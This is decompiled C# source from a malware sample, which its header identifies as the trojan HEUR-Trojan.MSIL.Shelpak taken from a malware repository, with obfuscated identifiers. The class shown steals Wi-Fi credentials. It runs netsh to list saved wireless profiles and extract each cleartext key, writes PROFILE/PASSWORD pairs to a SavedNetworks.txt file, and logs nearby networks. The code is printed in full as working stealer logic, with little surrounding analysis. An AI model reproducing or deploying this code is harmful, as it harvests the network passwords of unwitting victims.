// Decompiled with JetBrains decompiler
// Type: 見匚阜子攴方土石舛夂革心又.十廴辵赤隶疋欠夂攴冂頁高亅厂
// Assembly: correcthit, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 98A8C508-DCA7-4494-BD18-281291040E34
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Shelpak.gen-d9c811eae2b07eca77f74ca45e1efee2a2c91add3f8606c489f526eb43f55287.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using 屮虫卜毛皿欠虍丿艸弋宀艸長工广立山;
using 火長宀舛火尸彐方自儿丿广;

namespace 見匚阜子攴方土石舛夂革心又
{
  internal sealed class 十廴辵赤隶疋欠夂攴冂頁高亅厂
  {
    private static string[] 玉比殳豕卜亠鼠屮非比二()
    {
      string[] strArray = 又鬥冫刀聿冫夕隹无冫.辵丨黽干殳龍彐血土凵言歹虫殳("/C chcp 65001 && netsh wlan show profile | findstr All").Split(new char[2]
      {
        '\r',
        '\n'
      }, StringSplitOptions.RemoveEmptyEntries);
      for (int index = 0; index < strArray.Length; ++index)
        strArray[index] = strArray[index].Substring(strArray[index].LastIndexOf(':') + 1).Trim();
      return strArray;
    }

    private static string 寸一厶小女豆爿黹月火戈幺(string 鼎凵黽殳石冫心己人邑欠甘) => ((IEnumerable<string>) 又鬥冫刀聿冫夕隹无冫.辵丨黽干殳龍彐血土凵言歹虫殳("/C chcp 65001 && netsh wlan show profile name=\"" + 鼎凵黽殳石冫心己人邑欠甘 + "\" key=clear | findstr Key").Split(':')).Last<string>().Trim();

    public static void 夕米至豕力臣鬲卜臣赤日网宀欠鼓(string 口又皿无丶气鹵衣骨缶黑)
    {
      string contents = 又鬥冫刀聿冫夕隹无冫.辵丨黽干殳龍彐血土凵言歹虫殳("/C chcp 65001 && netsh wlan show networks mode=bssid");
      File.AppendAllText(口又皿无丶气鹵衣骨缶黑 + "\\ScanningNetworks.txt", contents);
    }

    public static void 糸尢爻豕卜廾卩文手夊木厶(string 玄貝廴无大行口儿尸見几士木曰)
    {
      foreach (string 鼎凵黽殳石冫心己人邑欠甘 in 十廴辵赤隶疋欠夂攴冂頁高亅厂.玉比殳豕卜亠鼠屮非比二())
      {
        if (!鼎凵黽殳石冫心己人邑欠甘.Equals("65001"))
        {
          ++丿士止土巾幺山田巾弋宀小.卩黃禸毛馬儿牛示曰音馬尸丨;
          string str = 十廴辵赤隶疋欠夂攴冂頁高亅厂.寸一厶小女豆爿黹月火戈幺(鼎凵黽殳石冫心己人邑欠甘);
          string contents = "PROFILE: " + 鼎凵黽殳石冫心己人邑欠甘 + "\nPASSWORD: " + str + "\n\n";
          File.AppendAllText(玄貝廴无大行口儿尸見几士木曰 + "\\SavedNetworks.txt", contents);
        }
      }
    }
  }
}
